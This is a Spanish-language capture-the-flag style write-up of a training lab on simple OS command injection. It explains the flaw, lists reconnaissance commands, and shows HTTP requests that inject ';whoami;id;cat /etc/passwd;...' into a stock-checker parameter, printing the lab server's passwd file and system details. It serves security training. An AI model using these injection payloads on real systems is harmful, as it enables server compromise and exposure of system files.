# 🕹️ Laboratorio: Inyección de comandos del sistema operativo, caso simple

**Inyección de comandos del sistema operativo**Las vulnerabilidades de inyección de comandos permiten a un atacante ejecutar comandos arbitrarios del sistema operativo (SO) en el servidor. Esto les da control total sobre el servidor, comprometiendo la aplicación y todos sus datos.

### ¿Qué es la inyección de comandos del sistema operativo?

La inyección de comandos del sistema operativo también se conoce como inyección de shell. Permite a un atacante ejecutar comandos del sistema operativo (SO) en el servidor que ejecuta una aplicación y, por lo general, compromete completamente la aplicación y sus datos. A menudo, un atacante puede aprovechar una vulnerabilidad de inyección de comandos del sistema operativo para comprometer otras partes de la infraestructura de alojamiento y explotar las relaciones de confianza para dirigir el ataque a otros sistemas dentro de la organización.

### Comandos útiles

Después de identificar una vulnerabilidad de inyección de comandos del sistema operativo, es útil ejecutar algunos comandos iniciales para obtener información sobre el sistema. A continuación se muestra un resumen de algunos comandos que son útiles en las plataformas Linux y Windows:

| Propósito del mando       | linux         | ventanas        |
| ------------------------- | ------------- | --------------- |
| Nombre del usuario actual | `whoami`      | `whoami`        |
| Sistema operativo         | `uname -a`    | `ver`           |
| Configuración de la red   | `ifconfig`    | `ipconfig /all` |
| Conexiones de red         | `netstat -an` | `netstat -an`   |
| Procesos corriendo        | `ps -ef`      | `tasklist`      |

### Inyectar comandos del sistema operativo

En este ejemplo, una aplicación de compras permite al usuario ver si un artículo está disponible en una tienda en particular. Se accede a esta información a través de una URL:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

Para proporcionar información bursátil, la aplicación debe consultar varios sistemas heredados. Por razones históricas, la funcionalidad se implementa llamando a un comando de shell con los ID del producto y de la tienda como argumentos:

`stockreport.pl 381 29`

Este comando genera el estado del stock del artículo especificado, que se devuelve al usuario.

### Inyectar comandos del sistema operativo - Continuación

La aplicación no implementa defensas contra la inyección de comandos del sistema operativo, por lo que un atacante puede enviar la siguiente entrada para ejecutar un comando arbitrario:

`& echo aiwefwlguh &`

Si esta entrada se envía en el `productID`parámetro, el comando ejecutado por la aplicación es:

`stockreport.pl & echo aiwefwlguh & 29`

El `echo`comando hace que la cadena proporcionada se repita en la salida. Esta es una forma útil de probar algunos tipos de inyección de comandos del sistema operativo. El `&`carácter es un separador de comandos de shell. En este ejemplo, hace que se ejecuten tres comandos separados, uno tras otro. La salida devuelta al usuario es:

`Error - productID was not provided aiwefwlguh 29: command not found`

Las tres líneas de resultados demuestran que:

* El comando original `stockreport.pl`se ejecutó sin los argumentos esperados y, por lo tanto, devolvió un mensaje de error.
* El comando inyectado `echo`se ejecutó y la cadena proporcionada se repitió en la salida.
* El argumento original `29`se ejecutó como un comando, lo que provocó un error.

Colocar el separador de comando adicional `&`después del comando inyectado es útil porque separa el comando inyectado de lo que sigue al punto de inyección. Esto reduce la posibilidad de que lo siguiente impida que se ejecute el comando inyectado.

### Laboratorio: inyección de comandos del sistema operativo, caso simple

APRENDIZ

LABORATORIONo resuelto

Esta práctica de laboratorio contiene una vulnerabilidad de inyección de comandos del sistema operativo en el verificador de existencias de productos.

La aplicación ejecuta un comando de shell que contiene los ID de tienda y producto proporcionados por el usuario, y devuelve el resultado sin procesar del comando en su respuesta.

Para resolver la práctica de laboratorio, ejecute el `whoami`comando para determinar el nombre del usuario actual.

```python
// Some code

Laboratorio: inyección de comandos del sistema operativo, caso simple







INVESTIGAMOS UN POCO LA PAGINA I VEMOS QUE UTILIZA ID NUMERICOS COMUNES PARA LOS PRODUCTOS EN SU HTML, Y LUEGO CAPTURAMOS LA REQUEST DE LA SOLICITUD DE CONSULTA DE LA CANTIDAD DE PRODUCTOS PAARA TRABAJAR CON ELLA EN REPITER:





REQUEST ORIGINAL:



POST /product/stock HTTP/2
Host: 0a44009d04476521832ac97500f6006a.web-security-academy.net
Cookie: session=FQNrB0YT17TwxZmkQudFdRcKPfcMaqqb
Content-Length: 21
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a44009d04476521832ac97500f6006a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a44009d04476521832ac97500f6006a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

productId=1&storeId=1







Y NOS DEVOLVIO ASI LA CANTIDAD DE ITEMS DE PROCTOS NORMAL.







AHORA INTENTAMOS CARGAR INYECCIOND E COMANDOS DENTRO DE LOSPARAMETROS DED PROCTID Y STOREID SEPARANDOLOS CON AMPERSON & , Y NO FUNCIONO ASI, PERO SI SE TENZO USANDO PUNTO Y COMA ; LOGRANDO LA EJECUCION DE COMANDOS INYECTADOS ATARABES DE ESTA FUNCION VULNERABLES:





REQUEST CON SOLO UNA IMPRESION PARA COMPROBAR:



POST /product/stock HTTP/2
Host: 0a44009d04476521832ac97500f6006a.web-security-academy.net
Cookie: session=FQNrB0YT17TwxZmkQudFdRcKPfcMaqqb
Content-Length: 32
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a44009d04476521832ac97500f6006a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a44009d04476521832ac97500f6006a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

productId=;echo P4IM0N&storeId=1






RESPONSE SE TENZO:


HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9

P4IM0N 1








REQUEST CONTODA LA INFO DEL SERVIDOR:




POST /product/stock HTTP/2
Host: 0a44009d04476521832ac97500f6006a.web-security-academy.net
Cookie: session=FQNrB0YT17TwxZmkQudFdRcKPfcMaqqb
Content-Length: 38
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a44009d04476521832ac97500f6006a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a44009d04476521832ac97500f6006a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

productId=;echo P4IM0N&storeId=;whoami





RESPONSE BINGO TENEMOS EL USUARIO:



HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

P4IM0N
peter-0T0L0D






REQUEST CON MAS INFO:



POST /product/stock HTTP/2
Host: 0a44009d04476521832ac97500f6006a.web-security-academy.net
Cookie: session=FQNrB0YT17TwxZmkQudFdRcKPfcMaqqb
Content-Length: 79
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a44009d04476521832ac97500f6006a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a44009d04476521832ac97500f6006a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

productId=;echo P4IM0N&storeId=;whoami;id;cat /etc/passwd;pwd;ifconfig;uname -a







RESPONSE SE TENZO MAL:





HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2545

P4IM0N

peter-0T0L0D

uid=12001(peter-0T0L0D) gid=12001(peter) groups=12001(peter)

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
peter-0T0L0D:x:12001:12001::/home/peter-0T0L0D:/bin/bash

/home/peter-0T0L0D

Linux 5a3745904d4e 4.14.254-252.552.amzn2.x86_64 #1 SMP Tue Jan 2 17:47:37 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux





```
